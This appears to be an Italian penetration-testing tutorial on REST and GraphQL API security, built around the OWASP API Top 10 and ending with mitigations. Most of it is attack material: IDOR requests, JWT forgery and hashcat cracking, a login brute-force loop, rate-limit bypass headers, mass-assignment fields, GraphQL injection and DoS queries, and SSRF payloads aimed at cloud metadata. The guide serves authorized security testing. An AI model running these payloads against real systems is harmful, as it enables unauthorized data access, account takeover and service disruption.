# API Security

## Scopo

Questa guida copre vulnerabilità e tecniche di testing per API REST e GraphQL, fondamentali nel moderno penetration testing di applicazioni web e mobile.

## Prerequisiti

- Conoscenza REST e GraphQL
- Postman o Burp Suite
- Conoscenza autenticazione (OAuth, JWT)
- **Autorizzazione per testing**

## Strumenti

```bash
sudo apt-get install jq curl
# Postman, Insomnia
# Burp Suite
```

---

## OWASP API Security Top 10

| # | Vulnerabilità |
|---|---------------|
| 1 | Broken Object Level Authorization (BOLA) |
| 2 | Broken Authentication |
| 3 | Broken Object Property Level Authorization |
| 4 | Unrestricted Resource Consumption |
| 5 | Broken Function Level Authorization |
| 6 | Unrestricted Access to Sensitive Business Flows |
| 7 | Server Side Request Forgery (SSRF) |
| 8 | Security Misconfiguration |
| 9 | Improper Inventory Management |
| 10 | Unsafe Consumption of APIs |

---

## Reconnaissance

### Endpoint Discovery

```bash
# Wordlist fuzzing
ffuf -u https://target/api/FUZZ -w api-endpoints.txt

# Swagger/OpenAPI
curl https://target/swagger.json
curl https://target/api-docs
curl https://target/openapi.json
curl https://target/v2/api-docs

# GraphQL
curl https://target/graphql
curl https://target/graphql/console
```

### API Documentation

```bash
# Common paths
/api/
/api/v1/
/api/v2/
/api/docs
/swagger-ui/
/swagger.json
/openapi.yaml
/graphql
/graphiql
```

---

## BOLA (IDOR)

### Test

```bash
# Richiesta originale (user1)
GET /api/users/1001/orders HTTP/1.1
Authorization: Bearer TOKEN_USER1

# Cambia ID (accesso a user2)
GET /api/users/1002/orders HTTP/1.1
Authorization: Bearer TOKEN_USER1

# Se ottieni dati = BOLA
```

### Varianti

```
# UUID
/api/documents/550e8400-e29b-41d4-a716-446655440000

# Encoded
/api/users/base64(1001)

# Nested
/api/org/123/users/456/data
```

---

## Broken Authentication

### JWT Testing

```bash
# Decode
echo "JWT_TOKEN" | cut -d. -f2 | base64 -d

# None algorithm
python3 jwt_tool.py TOKEN -X a

# Weak secret
hashcat -m 16500 jwt.txt wordlist.txt

# Key confusion
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### Token Expiration

```bash
# Usa token scaduto
# Se funziona = no expiration check
```

### OAuth Flaws

```
- Open redirect in callback
- State parameter missing
- Token leakage in referrer
- Scope manipulation
```

---

## Rate Limiting

### Test

```bash
# Burst requests
for i in {1..100}; do
    curl -s https://target/api/login -d "user=admin&pass=test$i" &
done

# Con Burp Intruder
# Osserva se rate limiting presente
```

### Bypass

```
# IP rotation
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4

# Case sensitivity
/api/Login
/API/login

# Parameter pollution
?id=1&id=2
```

---

## Mass Assignment

### Test

```bash
# Registrazione normale
POST /api/register
{"username":"test","password":"test123"}

# Con parametri extra
POST /api/register
{"username":"test","password":"test123","role":"admin","isAdmin":true}
```

### Campi Comuni

```json
{
  "role": "admin",
  "isAdmin": true,
  "verified": true,
  "credits": 99999,
  "permissions": ["admin"],
  "id": 1
}
```

---

## GraphQL Testing

### Introspection

```graphql
# Query introspection
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Mutations
{
  __schema {
    mutationType {
      fields {
        name
        args { name }
      }
    }
  }
}
```

### GraphQL Attacks

```graphql
# BOLA
{ user(id: 1002) { email password } }

# Injection
{ user(id: "1 OR 1=1") { name } }

# Batch query (DoS)
{
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
  ...
  u1000: user(id: 1000) { name }
}

# Nested query (DoS)
{ user { friends { friends { friends { name } } } } }
```

### Tools

```bash
# GraphQL Voyager - Visualize schema
# InQL - Burp extension
# graphql-cop - Security scanner

graphql-cop -t https://target/graphql
```

---

## SSRF via API

```bash
# Webhook/callback URL
POST /api/webhook
{"url": "http://169.254.169.254/latest/meta-data/"}

# PDF generator
POST /api/generate-pdf
{"url": "http://internal-server/admin"}

# Image fetch
POST /api/avatar
{"imageUrl": "http://localhost:8080/admin"}
```

---

## API Versioning Issues

```bash
# Vecchia versione potrebbe essere meno sicura
/api/v1/users  # Old, vulnerable
/api/v2/users  # Patched

# Test entrambe
```

---

## Error Disclosure

```bash
# Forza errori
GET /api/users/admin' HTTP/1.1
GET /api/users/-1 HTTP/1.1
GET /api/users/9999999999 HTTP/1.1

# Osserva stack trace, info interne
```

---

## Postman/Insomnia Workflow

```
1. Import OpenAPI/Swagger
2. Crea collection per endpoint
3. Configura variabili ambiente
4. Aggiungi test automatici
5. Esegui collection con diversi token/ruoli
```

---

## Burp Suite API Testing

```
1. Proxy mobile app o frontend
2. Cattura API calls
3. Analizza autenticazione
4. Test parametri con Repeater
5. Fuzz con Intruder
6. Scan automatico
```

---

## Mitigazioni

### Authentication

```
- OAuth 2.0 con PKCE
- JWT con firma forte e expiration
- Rate limiting
- MFA per operazioni sensibili
```

### Authorization

```
- Check autorizzazione server-side
- Principio least privilege
- Logging accessi
```

### Input Validation

```
- Schema validation
- Whitelist parametri
- Sanitization
```

---

## Best Practices

- **Documentation**: Leggi API docs prima di testare
- **Roles**: Testa con diversi ruoli utente
- **Automation**: Script per test ripetitivi
- **Logging**: Documenta tutti i finding
- **Scope**: Rispetta boundaries autorizzati

## Riferimenti

- [OWASP API Security](https://owasp.org/www-project-api-security/)
- [HackTricks API Testing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting)
- [PortSwigger API Testing](https://portswigger.net/web-security/api-testing)
- [GraphQL Security](https://graphql.security/)
